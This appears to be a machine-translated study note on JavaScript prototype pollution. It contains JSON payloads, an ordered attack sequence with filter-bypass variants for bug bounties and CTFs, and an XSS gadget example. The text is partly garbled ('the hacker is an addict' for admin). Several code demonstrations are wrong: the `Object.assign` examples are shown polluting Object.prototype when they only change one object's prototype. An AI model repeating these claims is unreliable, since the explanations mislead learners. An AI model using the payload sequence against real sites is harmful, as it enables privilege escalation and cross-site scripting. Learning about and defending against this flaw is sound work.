# prototype pollution


<details>
  <summary>What is prototype pollution</summary>


✅ First: What does Prototype mean?
=========================================

In JavaScript, any object that has a *parent* is named **prototype**.

Simple example:

```js
const person = {};
```

This `person` is empty... but if you do:

```js
console.log(person.toString);
```

In it you will find a function called `toString`\
Even though you **didn't write it**!

for him?\
Because `person` inherits ready-made functions from **object prototype**.

Think about it like this:

👨‍👦 i.e. Object = son...\
👴 Prototype = the parent from whom the son inherits ready-made properties.


---

✅ Ok, what does Prototype Pollution mean?
===================================

It is that **The hacker can modify the father (prototype)**\
Therefore **all children (all objects)** change automatically... and this is very dangerous.


---

🎯 A very simple real example

======================

Suppose there is a site that stores user settings in an object named `settings`.

The site allows the user to modify the settings himself through JSON.

It's supposed to be JSON like this:

```json
{

  "theme": "dark"

}
```

But the hacker can send:

```json
{

  "__proto__": {

    "isAdmin": true

  }

}
```

What will happen?

It will add the `isAdmin = true` property to **Object.prototype**

This means that every object on the site will have:

```json
obj.isAdmin === true
```

Thus, the site may think that the hacker is an addict... and from here it happens:

- Unauthorized Access

-   Bypass Auth

-   Code Execution sometimes

-   Change important functions


----

## 🎯 Practical example in code

```js
let user = {};

console.log(user.isAdmin); // undefined

// hacker payload
let payload = JSON.parse('{"__proto__": {"isAdmin": true}}');

Object.assign({}, payload);

console.log(user.isAdmin); // true !!!
```


Note:

- `user` object is already **empty**

- However, it became `isAdmin=true`

- Because the hacker poisoned the prototype

---


<details>
  <summary>Q</summary>


🎯 **First question: Do we always have to write `__proto__`?**
=================================================

**no.**\
You don't always have to use `__proto__`.

There are 3 main ways of pollution:

1️⃣ `__proto__`
---------------

This is the most popular method:

```json
{ "__proto__": { "isAdmin": true } }
```

This is to modify **Object.prototype**.

* * * * *

2️⃣ `constructor.prototype`
---------------------------

Stronger method:

```json
{ "constructor": { "prototype": { "isAdmin": true } } }
```

You modify the prototype via constructor.

* * * * *

3️⃣ `prototype`
---------------

This is used in functions/classes:

```json
{ "prototype": { "isAdmin": true } }
```

* * * * *

🎯 **The second question: How does the code work? (Execution Flow)**
====================================================

You feel that there is something mysterious because you do not see the “journey” that the code is making.

Let me explain it in an easier way:

* * * * *

⭐ **This journey happens when the code runs Merge / Assign / Deep Copy**
=================================================================

for example:

```js
Object.assign(target, userInput);
```

or

```js
_.merge(target, userInput);
```

or

```
jQuery.extend(true, target, userInput);
```

All of these do the same thing we will explain.

---

✨ Step 1: JavaScript takes the keys from the user input
-----------------------------------------------------

example:

```js
{
  "__proto__": { "x": 1 }
}
```

JavaScript shows:\
**It has a key named `__proto__`**

* * * * *

✨ Step 2: JavaScript tries to add this key to the target
-----------------------------------------------------

If we wrote:

```js
Object.assign({}, { "__proto__": { "x": 1 } });
```

It will not add a regular property called `__proto__`\
No... JavaScript will say:

> Oh... This is the key that modifies the prototype of the object itself.

And it remains as if it worked:

```js
Object.prototype.x = 1;
```

* * * * *

✨ Step 3: Every object in the program is affected

-------------------------------------

for him?

Because every Object is inherited from **Object.prototype**

Any new or old object will remain in it:

```js
anyObject.x === 1
```

Even if object is empty:

```js
let a = {};

console.log(a.x); // 1
```

* * * * *

🎯 Ok, why does JavaScript do this?

=============================================

Why is `__proto__` not a regular key?

Because historically, `__proto__` was a built-in way to manually change the prototype.

Like this:

```js
let obj = { a: 1 };

let newProto = { b: 2 };

obj.__proto__ = newProto;
```

This is an old concept in JavaScript...

But some merge libraries treat `__proto__` as if it were a regular key -- and here is the problem.

* * * * *


🎯 An example that literally shows flow
=========================================

See this example step by step:

```js
let settings = {};   // target

let payload = {
  "__proto__": {
    hacked: true
  }
};

// The merge process that occurs on real sites
Object. assign(settings, payload);

```

Steps:

1. JavaScript reads key=`__proto__`

2. It knows that it is **private** (not a regular key)

3. Changes Object.prototype

4. All objects are contaminated

try:

```js
let user = {};
console. log(user. hacked);   //true
```

Even if `user` has nothing to do with settings or payload.

* * * * *

🔥 A stronger example that explains everything
=========================

```js
let safe = {};
console.log(safe.isAdmin); //undefined

let attacker_payload = JSON. parse(`
{
  "__proto__": {
    "isAdmin": true
  }
}
`);

Object. assign({}, attacker_payload);

console.log(safe.isAdmin); // true (disaster)

```













⭐ **The ideal order used by hackers (and in CTFs)**
=======================================================

1️⃣ The first thing to do is try `__proto__`
--------------------------

Because it is the “weakest + most common” and wins close to 60% of cases.

Payload:

`{ "__proto__": { "isAdmin": true } }`

* * * * *

2️⃣ If that doesn't work → try `constructor.prototype`
-----------------------------------------

This is the strongest one, and often works when the parser prevents `__proto__`.

Payload:

`{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}`

This is very dangerous, especially in Node.js.

* * * * *





3️⃣ If not → try `prototype`
---------------------------------

This works if the internal code deals with Functions and not Objects.

Payload:

`{
  "prototype": {
    "isAdmin": true
  }
}`

It works specifically with classes.

* * * * *


4️⃣ Then try Variations
---------------------------

This is important in bug bounty because sometimes dev is a partial validation operator:

### Variation #1 --- Escape keys

`{ "\\__proto__": { "isAdmin": true } }`

### Variation #2 --- Arrays

`{
  "__proto__": [{
    "isAdmin": true
  }]
}`

### Variation #3 --- Nested pollution

`{
  "a": {
    "__proto__": { "isAdmin": true }
  }
}`

Sometimes the code does a deep merge, so it remains effective.

* * * * *

🎯 **When should I use which one?**
===============================

Look at this table:

| status | The method that will most likely work |
| --- | --- |
| Old site/jQuery library/lodash before 4.17 | `__proto__` |
| The code explicitly prevents `__proto__` | `constructor.prototype` |
| The code deals with classes, not objects | `prototype` |
| In Validation in the form of the key | Use escaped version |
| The code performs a deep merge of nested content | nested `__proto__` |

* * * * *

🔥 **How ​​do I know it worked?**
=============================

Do a simple test:

`{
  "__proto__": { "pwned": 1 }
}`

And after you do send\
Try on any other request:

`{}["pwned"]`

If it returns `1` → the site remains **polluted**

















  
</details>


---



  
</details>



<details>
  <summary>How do prototype pollution vulnerabilities arise?</summary>


🎯 **Prototype Pollution vulnerabilities arise when...?**
=======================================================

**When JavaScript merges an object, it receives data from the user.
Without making sure that the keys inside it are safe.**

* * * * *

💡 A very simple example
-----------------

The program has object:

```js
let settings = { theme: "light" };
```

It takes input from the user:

```js
{
  "__proto__": {
    "isAdmin": true
  }
}
```

And the developer works:

```js
Object.assign(settings, userInput);
```

It is supposed to add a regular property...\
But because the key is `__proto__` → JavaScript modifies **Object.prototype**.

Hence:

```js
console.log({}.isAdmin); // true ← prototype polluted
```

* * * * *


🔥 Main point
==================

JavaScript specifically understands `__proto__`...\
It is not as if it is just a key, but as if it were **instructions telling him: “Modify the prototype”**.

Why does merge happen without sanitization?
The attack works.

* * * * *

⭐ PortSwigger Explanation (Guaranteed in simple style)
===============================================

✔️ (1) **Prototype Pollution Source**
-------------------------------------

This is the place where the hacker can enter a key like:

- `__proto__`

- `constructor`

- `prototype`

If the API endpoint receives:

```js
{ "__proto__": { "x": 1 } }
```

Without validation → you have Source.

* * * * *

✔️ (2) **Sink**
---------------

The "sink" is the place where the value with which the prototype was tainted is used.
In a dangerous way.

Example of sinks:

- DOM XSS (`innerHTML`, `src`, `href`)

- `eval()`

- file path operations

- template engines

It means a place that allows code to be executed or important behavior to be changed.

* * * * *

✔️ (3) **Gadget**
-----------------

This is the key that was contaminated and is used inside the sink.

example:

If you contaminate the prototype with:

```js
Object.prototype.src = "javascript:alert(1)";
```

And then a JavaScript page in it:

```js
img.src = userInput.src;
```

Here `src` comes from prototype due to contamination → gets XSS.

* * * * *

🎯 The final summary in an easy way
=============================

### Prototype Pollution = Pollution of the prototype using a private key

An explosion occurs when the following is present:

### 1️⃣ **Source**

User input allows the addition of dangerous keys (`__proto__`).

### 2️⃣ **Gadget**

The tainted property itself (such as `src`, `isAdmin`, or `toString`).

### 3️⃣ **Sink**

A place in the code that uses the property dangerously leads to:

- Privilege escalation

-XSS

-RCE

-Bypass checks

- DoS

* * * * *

🎉 A complete example that brings all three together
==============================

### Source

```js
{ "__proto__": { "evil": "<img src=x onerror=alert(1)>" } }
```

### Gadget

`evil`

### Sink

`element.innerHTML = user.evil;`

#### Result:

XSS from Prototype Pollution.











  
</details>



<details>
  <summary>Prototype pollution sources</summary>












  
</details>






































